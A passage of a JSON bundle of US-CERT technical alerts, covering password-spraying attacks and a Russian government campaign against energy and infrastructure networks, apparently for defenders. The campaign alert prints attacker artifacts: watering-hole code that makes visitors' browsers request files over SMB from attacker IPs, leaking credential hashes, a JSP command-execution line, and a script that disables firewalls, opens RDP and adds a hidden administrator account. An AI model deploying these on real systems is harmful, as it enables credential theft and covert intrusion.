Edge Router Devices: Advisory. United Kingdom. National Cyber Security Centre. August 11, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.acsc.gov.au/news/routers-targeted.html\">[5] Routers Targeted. Australian Cyber Security Centre. August 16, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">[6] Cisco Smart Install Protocol Misuse. Cisco. February 14, 2017. Updated October 30, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.acsc.gov.au/news/routers-targeted.html\">[7] Routers Targeted. Australian Cyber Security Centre. August 16, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.iad.gov/iad/library/ia-advisories-alerts/cisco-smart-install-protocol-misuse.cfm\">[8] Cisco Smart Install Protocol Misuse. NSA, IAD. August 7, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">[9] Cisco Smart Install Protocol Misuse. Cisco. February 14, 2017. Updated October 30, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">[10] Cisco Smart Install Protocol Misuse. Cisco. February 14, 2017. Updated October 30, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://csrc.nist.gov/Glossary/?term=401\">[11] NIST CSRC.</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/report-phishing\">[12] US-CERT. Report Phishing.</a></li>\n            \t\t    \t<li><a href=\"https://www.cnss.gov/CNSS/issuances/Instructions.cfm\">[13] CNSSI 4009-2015. </a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>April 16, 2018: Initial Version</li>\n\t\t    \t\t\t    \t<li>April 19, 2018: Added third-party reporting</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2018-04-16T17:25:40.000Z"
		},
		{
			"type": "report",
			"title": "TA18-086A: Brute Force Attacks Conducted by Cyber Actors",
			"name": "TA18-086A: Brute Force Attacks Conducted by Cyber Actors",
			"id": "report--634c2237-5192-43da-bf18-509dd4b99553",
			"description": "Original release date: March 27, 2018 | Last revised: March 28, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Networked systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>According to information derived from FBI investigations, malicious cyber actors are increasingly using a style of brute force attack known as password spraying against organizations in the United States and abroad.</p><p>On February 2018, the Department of Justice in the Southern District of New York, indicted nine Iranian nationals, who were associated with the Mabna Institute, for computer intrusion offenses related to activity described in this report. The techniques and activity described herein, while characteristic of Mabna actors, are not limited solely to use by this group.</p><p>The Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI) are releasing this Alert to provide further information on this activity.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>In a traditional brute-force attack, a malicious actor attempts to gain unauthorized access to a single account by guessing the password. This can quickly result in a targeted account getting locked-out, as commonly used account-lockout policies allow three to five bad attempts during a set period of time. During a password-spray attack (also known as the “low-and-slow” method), the malicious actor attempts a single password against many accounts before moving on to attempt a second password, and so on. This technique allows the actor to remain undetected by avoiding rapid or frequent account lockouts.</p><p>Password spray campaigns typically target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols. An actor may target this specific protocol because federated authentication can help mask malicious traffic. Additionally, by targeting SSO applications, malicious actors hope to maximize access to intellectual property during a successful compromise. </p><p>Email applications are also targeted. In those instances, malicious actors would have the ability to utilize inbox synchronization to (1) obtain unauthorized access to the organization's email directly from the cloud, (2) subsequently download user mail to locally stored email files, (3) identify the entire company’s email address list, and/or (4) surreptitiously implements inbox rules for the forwarding of sent and received messages.</p><h3>Technical Details</h3><p>Traditional tactics, techniques, and procedures (TTPs) for conducting the password-spray attacks are as follows:</p><ul><li>Using social engineering tactics to perform online research (i.e., Google search, LinkedIn, etc.) to identify target organizations and specific user accounts for initial password spray</li><li>Using easy-to-guess passwords (e.g., “Winter2018”, “Password123!”) and publicly available tools, execute a password spray attack against targeted accounts by utilizing the identified SSO or web-based application and federated authentication method</li><li>Leveraging the initial group of compromised accounts, downloading the Global Address List (GAL) from a target’s email client, and performing a larger password spray against legitimate accounts</li><li>Using the compromised access, attempting to expand laterally (e.g., via Remote Desktop Protocol) within the network, and performing mass data exfiltration using File Transfer Protocol tools such as FileZilla</li></ul><p>Indicators of a password spray attack include:</p><ul><li>A massive spike in attempted logons against the enterprise SSO portal or web-based application;<ul><li>Using automated tools, malicious actors attempt thousands of logons, in rapid succession, against multiple user accounts at a victim enterprise, originating from a single IP address and computer (e.g., a common User Agent String).</li><li>Attacks have been seen to run for over two hours.</li></ul></li><li>Employee logons from IP addresses resolving to locations inconsistent with their normal locations.</li></ul><h3>Typical Victim Environment</h3><p>The vast majority of known password spray victims share some of the following characteristics <a href=\"https://www.us-cert.gov/ncas/tips/ST04-002\">[1]</a><a href=\"https://www.us-cert.gov/ncas/tips/ST05-012\">[2]</a>:</p><ul><li>Use SSO or web-based applications with federated authentication method</li><li>Lack multifactor authentication (MFA)</li><li>Allow easy-to-guess passwords (e.g., “Winter2018”, “Password123!”)</li><li>Use inbox synchronization, allowing email to be pulled from cloud environments to remote devices</li><li>Allow email forwarding to be setup at the user level</li><li>Limited logging setup creating difficulty during post-event investigations</li></ul>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>Temporary or permanent loss of sensitive or proprietary information;</li><li>Disruption to regular operations;</li><li>Financial losses incurred to restore systems and files; and</li><li>Potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <h4>Recommended Mitigations</h4><p>To help deter this style of attack, the following steps should be taken:</p><ul><li>Enable MFA and review MFA settings to ensure coverage over all active, internet facing protocols.</li><li>Review password policies to ensure they align with the latest NIST guidelines <a href=\"https://pages.nist.gov/800-63-3/\">[3]</a> and deter the use of easy-to-guess passwords.</li><li>Review IT helpdesk password management related to initial passwords, password resets for user lockouts, and shared accounts. IT helpdesk password procedures may not align to company policy, creating an exploitable security gap.</li><li>Many companies offer additional assistance and tools the can help detect and prevent password spray attacks, such as the Microsoft blog released on March 5, 2018. <a href=\"https://cloudblogs.microsoft.com/enterprisemobility/2018/03/05/azure-ad-and-adfs-best-practices-defending-against-password-spray-attacks/\">[4]</a></li></ul><h4>Reporting Notice</h4><p>The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office or the FBI’s 24/7 Cyber Watch (CyWatch). Field office contacts can be identified at www.fbi.gov/contact-us/field. CyWatch can be contacted by phone at (855) 292-3937 or by e-mail at CyWatch@ic.fbi.gov. When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. Press inquiries should be directed to the FBI’s national Press Office at npo@ic.fbi.gov or (202) 324-3691.</p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/tips/ST04-002\">[1] NCCIC/US-CERT Tip ST04-002 – Choosing and Protecting Passwords </a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/tips/ST05-012\">[2] NCCIC/US-CERT Tip ST05-12 – Supplementing Passwords</a></li>\n            \t\t    \t<li><a href=\"https://pages.nist.gov/800-63-3/\">[3] NIST Special Publication 800-63 – Digital Identity Guidelines</a></li>\n            \t\t    \t<li><a href=\"https://cloudblogs.microsoft.com/enterprisemobility/2018/03/05/azure-ad-and-adfs-best-practices-defending-against-password-spray-attacks/\">[4] Microsoft. Azure AD and ADFS best practices: Defending against password spray attacks</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>March 27, 2018: Initial Version</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "10723 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA18-086A",
					"source_name": "open source",
					"description": "Original release date: March 27, 2018 | Last revised: March 28, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Networked systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>According to information derived from FBI investigations, malicious cyber actors are increasingly using a style of brute force attack known as password spraying against organizations in the United States and abroad.</p><p>On February 2018, the Department of Justice in the Southern District of New York, indicted nine Iranian nationals, who were associated with the Mabna Institute, for computer intrusion offenses related to activity described in this report. The techniques and activity described herein, while characteristic of Mabna actors, are not limited solely to use by this group.</p><p>The Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI) are releasing this Alert to provide further information on this activity.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>In a traditional brute-force attack, a malicious actor attempts to gain unauthorized access to a single account by guessing the password. This can quickly result in a targeted account getting locked-out, as commonly used account-lockout policies allow three to five bad attempts during a set period of time. During a password-spray attack (also known as the “low-and-slow” method), the malicious actor attempts a single password against many accounts before moving on to attempt a second password, and so on. This technique allows the actor to remain undetected by avoiding rapid or frequent account lockouts.</p><p>Password spray campaigns typically target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols. An actor may target this specific protocol because federated authentication can help mask malicious traffic. Additionally, by targeting SSO applications, malicious actors hope to maximize access to intellectual property during a successful compromise. </p><p>Email applications are also targeted. In those instances, malicious actors would have the ability to utilize inbox synchronization to (1) obtain unauthorized access to the organization's email directly from the cloud, (2) subsequently download user mail to locally stored email files, (3) identify the entire company’s email address list, and/or (4) surreptitiously implements inbox rules for the forwarding of sent and received messages.</p><h3>Technical Details</h3><p>Traditional tactics, techniques, and procedures (TTPs) for conducting the password-spray attacks are as follows:</p><ul><li>Using social engineering tactics to perform online research (i.e., Google search, LinkedIn, etc.) to identify target organizations and specific user accounts for initial password spray</li><li>Using easy-to-guess passwords (e.g., “Winter2018”, “Password123!”) and publicly available tools, execute a password spray attack against targeted accounts by utilizing the identified SSO or web-based application and federated authentication method</li><li>Leveraging the initial group of compromised accounts, downloading the Global Address List (GAL) from a target’s email client, and performing a larger password spray against legitimate accounts</li><li>Using the compromised access, attempting to expand laterally (e.g., via Remote Desktop Protocol) within the network, and performing mass data exfiltration using File Transfer Protocol tools such as FileZilla</li></ul><p>Indicators of a password spray attack include:</p><ul><li>A massive spike in attempted logons against the enterprise SSO portal or web-based application;<ul><li>Using automated tools, malicious actors attempt thousands of logons, in rapid succession, against multiple user accounts at a victim enterprise, originating from a single IP address and computer (e.g., a common User Agent String).</li><li>Attacks have been seen to run for over two hours.</li></ul></li><li>Employee logons from IP addresses resolving to locations inconsistent with their normal locations.</li></ul><h3>Typical Victim Environment</h3><p>The vast majority of known password spray victims share some of the following characteristics <a href=\"https://www.us-cert.gov/ncas/tips/ST04-002\">[1]</a><a href=\"https://www.us-cert.gov/ncas/tips/ST05-012\">[2]</a>:</p><ul><li>Use SSO or web-based applications with federated authentication method</li><li>Lack multifactor authentication (MFA)</li><li>Allow easy-to-guess passwords (e.g., “Winter2018”, “Password123!”)</li><li>Use inbox synchronization, allowing email to be pulled from cloud environments to remote devices</li><li>Allow email forwarding to be setup at the user level</li><li>Limited logging setup creating difficulty during post-event investigations</li></ul>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>Temporary or permanent loss of sensitive or proprietary information;</li><li>Disruption to regular operations;</li><li>Financial losses incurred to restore systems and files; and</li><li>Potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <h4>Recommended Mitigations</h4><p>To help deter this style of attack, the following steps should be taken:</p><ul><li>Enable MFA and review MFA settings to ensure coverage over all active, internet facing protocols.</li><li>Review password policies to ensure they align with the latest NIST guidelines <a href=\"https://pages.nist.gov/800-63-3/\">[3]</a> and deter the use of easy-to-guess passwords.</li><li>Review IT helpdesk password management related to initial passwords, password resets for user lockouts, and shared accounts. IT helpdesk password procedures may not align to company policy, creating an exploitable security gap.</li><li>Many companies offer additional assistance and tools the can help detect and prevent password spray attacks, such as the Microsoft blog released on March 5, 2018. <a href=\"https://cloudblogs.microsoft.com/enterprisemobility/2018/03/05/azure-ad-and-adfs-best-practices-defending-against-password-spray-attacks/\">[4]</a></li></ul><h4>Reporting Notice</h4><p>The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office or the FBI’s 24/7 Cyber Watch (CyWatch). Field office contacts can be identified at www.fbi.gov/contact-us/field. CyWatch can be contacted by phone at (855) 292-3937 or by e-mail at CyWatch@ic.fbi.gov. When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. Press inquiries should be directed to the FBI’s national Press Office at npo@ic.fbi.gov or (202) 324-3691.</p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/tips/ST04-002\">[1] NCCIC/US-CERT Tip ST04-002 – Choosing and Protecting Passwords </a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/ncas/tips/ST05-012\">[2] NCCIC/US-CERT Tip ST05-12 – Supplementing Passwords</a></li>\n            \t\t    \t<li><a href=\"https://pages.nist.gov/800-63-3/\">[3] NIST Special Publication 800-63 – Digital Identity Guidelines</a></li>\n            \t\t    \t<li><a href=\"https://cloudblogs.microsoft.com/enterprisemobility/2018/03/05/azure-ad-and-adfs-best-practices-defending-against-password-spray-attacks/\">[4] Microsoft. Azure AD and ADFS best practices: Defending against password spray attacks</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>March 27, 2018: Initial Version</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2018-03-27T22:00:26.000Z"
		},
		{
			"type": "report",
			"title": "TA18-074A: Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors",
			"name": "TA18-074A: Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors",
			"id": "report--07f34bc3-2bc6-4cee-80c8-cd42c13e716e",
			"description": "Original release date: March 15, 2018 | Last revised: March 16, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <ul><li>Domain Controllers</li><li>File Servers</li><li>Email Servers</li></ul>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides information on Russian government actions targeting U.S. Government entities as well as organizations in the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing sectors. It also contains indicators of compromise (IOCs) and technical details on the tactics, techniques, and procedures (TTPs) used by Russian government cyber actors on compromised victim networks. DHS and FBI produced this alert to educate network defenders to enhance their ability to identify and reduce exposure to malicious activity.</p><p>DHS and FBI characterize this activity as a multi-stage intrusion campaign by Russian government cyber actors who targeted small commercial facilities’ networks where they staged malware, conducted spear phishing, and gained remote access into energy sector networks. After obtaining access, the Russian government cyber actors conducted network reconnaissance, moved laterally, and collected information pertaining to Industrial Control Systems (ICS).</p><p>For a downloadable copy of IOC packages and associated files, see:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA18-074A_WHITE.csv\">TA18-074A_TLP_WHITE.csv</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA18-074A_WHITE_STIX.xml\">TA18-074A_TLP_WHITE.stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">MIFR-10127623_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE_stix.xml\">MIFR-10127623_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE.pdf\">MIFR-10128327_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE_stix.xml\">MIFR-10128327_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE.pdf\">MIFR-10128336_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE_stix.xml\">MIFR-10128336_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE.pdf\">MIFR-10128830­_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE_stix.xml\">MIFR-10128830­_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE.pdf\">MIFR-10128883_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE_stix.xml\">MIFR-10128883_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE.pdf\">MIFR-10135300_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE_stix.xml\">MIFR-10135300_TLP_WHITE_stix.xml</a></li></ul><p>Contact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Since at least March 2016, Russian government cyber actors—hereafter referred to as “threat actors”—targeted government entities and multiple U.S. critical infrastructure sectors, including the energy, nuclear, commercial facilities, water, aviation, and critical manufacturing sectors.</p><p>Analysis by DHS and FBI, resulted in the identification of distinct indicators and behaviors related to this activity. Of note, the report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[1]</a></p><p>This campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third-party suppliers with less secure networks, referred to as “staging targets” throughout this alert. The threat actors used the staging targets’ networks as pivot points and malware repositories when targeting their final intended victims. NCCIC and FBI judge the ultimate objective of the actors is to compromise organizational networks, also referred to as the “intended target.”</p><p><strong>Technical Details</strong></p><p>The threat actors in this campaign employed a variety of TTPs, including</p><ul><li>spear-phishing emails (from compromised legitimate account),</li><li>watering-hole domains,</li><li>credential gathering,</li><li>open-source and network reconnaissance,</li><li>host-based exploitation, and</li><li>targeting industrial control system (ICS) infrastructure.</li></ul><p><strong>Using Cyber Kill Chain for Analysis</strong></p><p>DHS used the Lockheed-Martin Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of threat actors’ activities within this framework.</p><p> </p><p><strong>Stage 1: Reconnaissance</strong></p><p>The threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting relationships with many of the intended targets. DHS analysis identified the threat actors accessing publicly available information hosted by organization-monitored networks during the reconnaissance phase. Based on forensic analysis, DHS assesses the threat actors sought information on network and organizational design and control system capabilities within organizations. These tactics are commonly used to collect the information needed for targeted spear-phishing attempts. In some cases, information posted to company websites, especially information that may appear to be innocuous, may contain operationally sensitive information. As an example, the threat actors downloaded a small photo from a publicly accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control systems equipment models and status information in the background.</p><p>Analysis also revealed that the threat actors used compromised staging targets to download the source code for several intended targets’ websites. Additionally, the threat actors attempted to remotely access infrastructure such as corporate web-based email and virtual private network (VPN) connections.</p><p> </p><p><strong>S<strong>tage 2: Weaponization</strong></strong></p><p><strong>Spear-Phishing Email TTPs </strong></p><p>Throughout the spear-phishing campaign, the threat actors used email attachments to leverage legitimate Microsoft Office functions for retrieving a document from a remote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//&lt;remote IP address&gt;/Normal.dotm). As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server before retrieving the requested file. (Note: transfer of credentials can occur even if the file is not retrieved.) After obtaining a credential hash, the threat actors can use password-cracking techniques to obtain the plaintext password. With valid credentials, the threat actors are able to masquerade as authorized users in environments that use single-factor authentication. <a href=\"https://www.kb.cert.org/vuls/id/672268\">[2]</a></p><p> </p><p><strong>Use of Watering Hole Domains </strong></p><p>One of the threat actors’ primary uses for staging targets was to develop watering holes. Threat actors compromised the infrastructure of trusted organizations to reach intended targets. [3] Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical infrastructure. Although these watering holes may host legitimate content developed by reputable organizations, the threat actors altered websites to contain and reference malicious content. The threat actors used legitimate credentials to access and directly modify the website content. The threat actors modified these websites by altering JavaScript and PHP files to request a file icon using SMB from an IP address controlled by the threat actors. This request accomplishes a similar technique observed in the spear-phishing documents for credential harvesting. In one instance, the threat actors added a line of code into the file “header.php”, a legitimate PHP file that carried out the redirected traffic.</p><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p>&lt;img src=\"https://www.us-cert.govfile[:]//62.8.193[.]206/main_logo.png\" style=\"height: 1px; width: 1px;\" /&gt;</p></td></tr></tbody></table><div style=\"clear: both;\"> </div></div><p>In another instance, the threat actors modified the JavaScript file, “modernizr.js”, a legitimate JavaScript library used by the website to detect various aspects of the user’s browser. The file was modified to contain the contents below:</p><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p>var i = document.createElement(\"img\");</p><p>i.src = \"file[:]//184.154.150[.]66/ame_icon.png\";</p><p>i.width = 3;</p><p>i.height=2;</p></td></tr></tbody></table><div style=\"clear: both;\"> </div><div style=\"clear: both;\"> </div></div><p><strong>Stage 3: Delivery </strong></p><p>When compromising staging target networks, the threat actors used spear-phishing emails that differed from previously reported TTPs. The spear-phishing emails used a generic contract agreement theme (with the subject line “AGREEMENT &amp; Confidential”) and contained a generic PDF document titled ``document.pdf. (Note the inclusion of two single back ticks at the beginning of the attachment name.) The PDF was not malicious and did not contain any active code. The document contained a shortened URL that, when clicked, led users to a website that prompted the user for email address and password. (Note: no code within the PDF initiated a download.)</p><p>In previous reporting, DHS and FBI noted that all of these spear-phishing emails referred to control systems or process control systems. The threat actors continued using these themes specifically against intended target organizations. Email messages included references to common industrial control equipment and protocols. The emails used malicious Microsoft Word attachments that appeared to be legitimate résumés or curricula vitae (CVs) for industrial control systems personnel, and invitations and policy documents to entice the user to open the attachment.</p><p> </p><p><strong>Stage 4: Exploitation </strong></p><p>The threat actors used distinct and unusual TTPs in the phishing campaign directed at staging targets. Emails contained successive redirects to http://bit[.]ly/2m0x8IH link, which redirected to http://tinyurl[.]com/h3sdqck link, which redirected to the ultimate destination of http://imageliners[.]com/nitel. The imageliner[.]com website contained input fields for an email address and password mimicking a login page for a website.</p><p>When exploiting the intended targets, the threat actors used malicious .docx files to capture user credentials. The documents retrieved a file through a “file://” connection over SMB using Transmission Control Protocol (TCP) ports 445 or 139. This connection is made to a command and control (C2) server—either a server owned by the threat actors or that of a victim. When a user attempted to authenticate to the domain, the C2 server was provided with the hash of the password. Local users received a graphical user interface (GUI) prompt to enter a username and password, and the C2 received this information over TCP ports 445 or 139. (Note: a file transfer is not necessary for a loss of credential information.) Symantec’s report associates this behavior to the Dragonfly threat actors in this campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[1]</a></p><p> </p><p><strong>Stage 5: Installation </strong></p><p>The threat actors leveraged compromised credentials to access victims’ networks where multi-factor authentication was not used. <a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[4]</a> To maintain persistence, the threat actors created local administrator accounts within staging targets and placed malicious files within intended targets.</p><p> </p><p><strong>Establishing Local Accounts </strong></p><p>The threat actors used scripts to create local administrator accounts disguised as legitimate backup accounts. The initial script “symantec_help.jsp” contained a one-line reference to a malicious script designed to create the local administrator account and manipulate the firewall for remote access. The script was located in “C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection Manager\\tomcat\\webapps\\ROOT\\”.</p><p> </p><p><strong>Contents of symantec_help.jsp </strong></p><p>____________________________________________________________________________________________________________________</p><p>&lt;% Runtime.getRuntime().exec(\"cmd /C \\\"\" + System.getProperty(\"user.dir\") + \"\\\\..\\\\webapps\\\\ROOT\\\\&lt;enu.cmd&gt;\\\"\"); %&gt;</p><p>____________________________________________________________________________________________________________________</p><p>The script “enu.cmd” created an administrator account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then attempted to add the newly created account to the administrators group to gain elevated privileges. This script contained hard-coded values for the group name “administrator” in Spanish, Italian, German, French, and English.</p><p> </p><p><strong>Contents of enu.cmd </strong></p><p>____________________________________________________________________________________________________________________</p><p>netsh firewall set opmode disable</p><p>netsh advfirewall set allprofiles state off</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</p><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f</p><p>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f</p><p>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f</p><p>reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v MaxInstanceCount /t REG_DWORD /d 100 /f</p><p>net user MS_BACKUP &lt;Redacted_Password&gt; /add</p><p>net localgroup Administrators /add MS_BACKUP</p><p>net localgroup Administradores /add MS_BACKUP</p><p>net localgroup Amministratori /add MS_BACKUP</p><p>net localgroup Administratoren /add MS_BACKUP</p><p>net localgroup Administrateurs /add MS_BACKUP</p><p>net localgroup \"Remote Desktop Users\" /add MS_BACKUP</p><p>net user MS_BACKUP /expires:never</p><p>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v MS_BACKUP /t REG_DWORD /d 0 /f</p><p>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f</p><p>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</p><p>sc config termservice start= auto</p><p>net start termservice</p><p>____________________________________________________________________________________________________________________</p><p>DHS observed the threat actors using this and similar scripts to create multiple accounts within staging target networks. Each account created by the threat actors served a specific purpose in their operation. These purposes ranged from the creation of additional accounts to cleanup of activity. DHS and FBI observed the following actions taken after the creation of these local accounts:</p><p><strong>Account 1</strong>: Account 1 was named to mimic backup services of the staging target. This account was created by the malicious script described earlier. The threat actor used this account to conduct open-source reconnaissance and remotely access intended targets.</p><p><strong>Account 2</strong>: Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.</p><p><strong>Account 3</strong>: Account 3 was created within the staging victim’s Microsoft Exchange Server. A PowerShell script created this account during an RDP session while the threat actor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial concatenated with the last name).</p><p><strong>Account 4</strong>: In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete logs and cover tracks.</p><p> </p><p><strong>Scheduled Task</strong></p><p>In addition, the threat 